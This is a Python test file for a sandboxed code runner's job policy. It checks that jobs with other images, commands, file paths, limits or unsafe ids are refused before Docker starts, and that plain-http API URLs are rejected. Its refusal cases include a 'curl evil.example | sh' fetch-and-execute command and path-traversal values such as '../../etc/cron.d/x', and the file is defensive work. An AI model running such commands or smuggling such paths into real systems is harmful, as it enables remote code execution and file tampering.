"""The runner's job policy (stage C5): what it agrees to run, without Docker.

What is asserted:
* a job matching a language profile, within bounds, is accepted;
* another image, another command, a different file name (e.g. a path outside the work folder), an
  unknown language, an oversized source or input, out-of-range limits, odd test entries and an unsafe
  job id are refused — before Docker is touched;
* digest pins are only accepted as `repo@sha256:<64 hex>` for images the runner uses, and are used;
* the API URL must be https, except to localhost.
"""

import pytest

from assessx_runner import sandbox, worker
from assessx_runner.policy import (
    MAX_INPUT_BYTES,
    MAX_SOURCE_BYTES,
    PROFILES,
    JobRejected,
    check_api_url,
    check_job,
    is_job_id,
    parse_pins,
)

DIGEST = "python@sha256:" + "a" * 64


def good(lang: str = "python", **overrides) -> dict:
    profile = PROFILES[lang]
    job = {
        "id": "0b6f1c2e-6b1a-4a43-9d6b-1d1f1d1f1d1f",
        "language": lang,
        "image": profile.image,
        "source_file": profile.source_file,
        "compile": list(profile.compile) if profile.compile else None,
        "run": list(profile.run),
        "source": "print(1)\n",
        "time_limit_ms": 4000,
        "memory_limit_mb": 256,
        "compile_time_limit_ms": 30_000,
        "compile_memory_mb": 1024,
        "output_limit_bytes": 65_536,
        "tests": [{"id": "custom", "input": "1 2"}],
    }
    job.update(overrides)
    return job


@pytest.mark.parametrize("lang", sorted(PROFILES))
def test_a_job_matching_its_language_profile_is_accepted(lang):
    assert check_job(good(lang)) is PROFILES[lang]


@pytest.mark.parametrize(
    "overrides",
    [
        {"image": "alpine:latest"},
        {"image": "python@sha256:" + "b" * 64},
        {"run": ["sh", "-c", "curl evil.example | sh"]},
        {"run": ["python3", "main.py"]},  # even a near miss: -I (isolated mode) dropped
        {"compile": ["gcc", "main.c"]},
        {"source_file": "../../etc/cron.d/x"},
        {"source_file": "/tmp/main.py"},
        {"language": "rust"},
        {"language": None},
        {"source": None},
        {"source": "x" * (MAX_SOURCE_BYTES + 1)},
        {"time_limit_ms": 0},
        {"time_limit_ms": 10**9},
        {"time_limit_ms": True},
        {"time_limit_ms": "4000"},
        {"memory_limit_mb": 1_000_000},
        {"compile_memory_mb": 1},
        {"output_limit_bytes": 10**9},
        {"tests": []},
        {"tests": [{"id": str(i), "input": ""} for i in range(101)]},
        {"tests": [{"id": "../x", "input": ""}]},
        {"tests": [{"id": "a", "input": "x" * (MAX_INPUT_BYTES + 1)}]},
        {"tests": [{"id": "a", "input": "1", "expected_output": "1"}]},
        {"tests": ["not a dict"]},
        {"id": "../../internal/runner/claim"},
        {"id": ""},
    ],
)
def test_anything_else_is_refused(overrides):
    with pytest.raises(JobRejected):
        check_job(good(**overrides))


def test_a_refused_job_never_reaches_docker(monkeypatch):
    calls = []
    monkeypatch.setattr(sandbox.subprocess, "run", lambda *a, **k: calls.append(a))
    monkeypatch.setattr(sandbox.subprocess, "Popen", lambda *a, **k: calls.append(a))
    with pytest.raises(JobRejected):
        sandbox.run_job(good(image="alpine:latest"))
    assert calls == []


def test_job_ids_must_be_safe_in_a_url():
    assert is_job_id("0b6f1c2e-6b1a-4a43-9d6b-1d1f1d1f1d1f")
    assert not is_job_id("../claim") and not is_job_id(None) and not is_job_id("a" * 65)


def test_digest_pins():
    assert parse_pins("") == {}
    assert parse_pins(f"python:3.12-slim={DIGEST}") == {"python:3.12-slim": DIGEST}
    with pytest.raises(ValueError, match="not an image"):
        parse_pins(f"alpine:latest={DIGEST}")
    with pytest.raises(ValueError, match="sha256"):
        parse_pins("python:3.12-slim=python:3.13")


def test_a_pinned_image_is_what_runs(monkeypatch):
    started = []

    def fake_run(argv, **_):
        started.append(argv)
        raise RuntimeError("stop here")

    monkeypatch.setattr(sandbox.subprocess, "run", fake_run)
    config = sandbox.SandboxConfig(pins={"python:3.12-slim": DIGEST})
    with pytest.raises(RuntimeError):
        sandbox.run_job(good(), config)
    first = started[0]
    assert first[:2] == ["docker", "run"] and DIGEST in first and "python:3.12-slim" not in first


@pytest.mark.parametrize(
    ("url", "ok"),
    [
        ("https://assessx-backend.example.org", True),
        ("http://127.0.0.1:8000", True),
        ("http://localhost:8000", True),
        ("http://assessx-backend.example.org", False),
        ("ftp://example.org", False),
        ("https://", False),
    ],
)
def test_the_api_url_must_be_https_except_locally(url, ok):
    if ok:
        assert check_api_url(url) == url
    else:
        with pytest.raises(ValueError):
            check_api_url(url)


def test_the_worker_refuses_to_start_on_plain_http(monkeypatch):
    monkeypatch.setenv("RUNNER_API_URL", "http://api.example.org")
    monkeypatch.setenv("RUNNER_TOKEN", "t" * 40)
    with pytest.raises(SystemExit, match="https"):
        worker.serve()


def test_the_worker_reports_a_refused_job_as_a_runner_failure(monkeypatch):
    failures = []

    class FakeApi:
        runner_id = "runner-1"
        claims = [good(image="alpine:latest"), good(id="../bad", image="alpine:latest")]

        def __init__(self, *_):
            pass

        def claim(self):
            if not self.claims:
                raise KeyboardInterrupt
            return self.claims.pop(0)

        def fail(self, job_id, reason):
            failures.append((job_id, reason))
            return 204

    monkeypatch.setenv("RUNNER_API_URL", "http://127.0.0.1:8000")
    monkeypatch.setenv("RUNNER_TOKEN", "t" * 40)
    monkeypatch.setattr(worker, "Api", FakeApi)
    monkeypatch.setattr(worker, "sweep", lambda config: None)
    with pytest.raises(KeyboardInterrupt):
        worker.serve()
    # The first is reported; the second's id is not safe to put in a URL, so it is only logged.
    assert failures == [(good()["id"], "refused by runner policy: image or commands do not match the language profile")]
